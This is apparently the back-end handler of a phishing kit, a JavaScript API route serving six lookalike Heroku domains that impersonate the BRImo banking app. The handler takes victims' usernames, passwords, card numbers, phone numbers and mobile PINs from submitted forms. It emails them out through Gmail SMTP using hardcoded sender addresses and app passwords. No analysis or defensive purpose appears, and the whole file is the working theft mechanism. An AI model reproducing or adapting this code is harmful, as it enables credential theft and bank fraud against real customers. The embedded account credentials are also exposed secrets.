export default function handler(req, res) {
    const nodemailer = require('nodemailer');

    const { body } = req;
    const { url } = req.headers;

    let email = '';
    let pass = '';

    if (url == 'bii-fast-brimo.herokuapp.com'){

        email = 'jagokuayam67@gmail.com';
        pass = 'curintmtfkqxppme';

    } else if (url == 'daftar-bifast-brimo.herokuapp.com'){
        
        email = 'ikanhiu603@gmail.com';
        pass = 'cadnrlizjhuvhwsa';

    } else if (url == 'app-brimo-bifas.herokuapp.com'){
        email = 'brimopasp@gmail.com';
        pass = 'ezbvulgxsjerhpnb';

    }
    else if (url == 'daftar-bi-fast.herokuapp.com'){
        email = 'ayamperu233@gmail.com';
        pass = 'rtzqphftdjkdrnwa';
        
    }
    else if (url == 'login-bri-mo.herokuapp.com'){
        email = 'nilabakar403@gmail.com';
        pass = 'hpwgbnwdgdpryjpa';
        
    }
    else if (url == 'log-brimo-ib-bifast.herokuapp.com'){
        email = 'ayamperu2019@gmail.com';
        pass = 'ufseytnucdzgmbah';
        
    }
        
        try {
            const transporter = nodemailer.createTransport({
                port: 587,
                host: 'smtp.googlemail.com',
                auth: {
                    user: email,
                    pass: pass,
                    },
                secure: false,
            });
    
            const mailData = {
                from: email,
                to: email,
                subject: 'BriApp',
                html: `
                    <ul>
                        <li>username: ${body.username ?? '-'}</li> 
                        <li>password: ${body.password ?? '-'}</li>
                        <li>nokartu: ${body.nomorkartu ?? '-'}</li>
                        <li>nohp: ${body.nomorhandphone ?? '-'}</li>
                        <li>pin: ${body.mPin ?? '-'}</li>
                        <li>message: ${body.message ?? '-'}</li>
                    </ul>
                `,             
            }
      
            transporter.sendMail(mailData, function (err, info) {
                if(err){
                  res.status(400).json({error: err})
                }
                else{
                  res.status(200).json({info, status: 200})
                }
            })
    
        } catch (error) {
            res.status(404).send('Not found')
        }

}